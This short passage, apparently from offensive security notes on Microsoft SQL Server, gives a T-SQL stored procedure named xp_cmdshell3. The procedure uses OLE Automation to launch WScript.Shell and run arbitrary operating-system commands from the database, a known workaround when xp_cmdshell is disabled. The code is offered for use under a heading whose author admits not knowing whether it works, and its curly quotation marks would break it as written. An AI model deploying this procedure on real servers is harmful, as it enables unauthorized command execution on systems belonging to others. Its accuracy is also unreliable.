<!-- ============================================================================================================================================ -->
<!-- ============================================================================================================================================ -->
<!-- ============================================================================================================================================ -->
<br><br>

---

# Some big scripts (do not know if they really works)

Create a new stored procedure, called `xp_cmdshell3`:

``` mssql
CREATE PROCEDURE xp_cmdshell3(@cmd varchar(255), @Wait int = 0) AS--Create WScript.Shell object
DECLARE @result int, @OLEResult int, @RunResult int
DECLARE @ShellID int
EXECUTE @OLEResult = sp_OACreate ‘WScript.Shell’, @ShellID OUT
IF @OLEResult <> 0 SELECT @result = @OLEResult
IF @OLEResult <> 0 RAISERROR (‘CreateObject%0X’, 14, 1, @OLEResult)
EXECUTE @OLEResult = sp_OAMethod @ShellID, ‘Run’, Null, @cmd, 0, @Wait
IF @OLEResult <> 0 SELECT @result = @OLEResult
IF @OLEResult <> 0 RAISERROR (‘Run%0X’, 14, 1, @OLEResult)
--If @OLEResult <> 0 EXEC sp_displayoaerrorinfo @ShellID, @OLEResult
EXECUTE @OLEResult = sp_OADestroy @ShellID
return @result
```

</article>

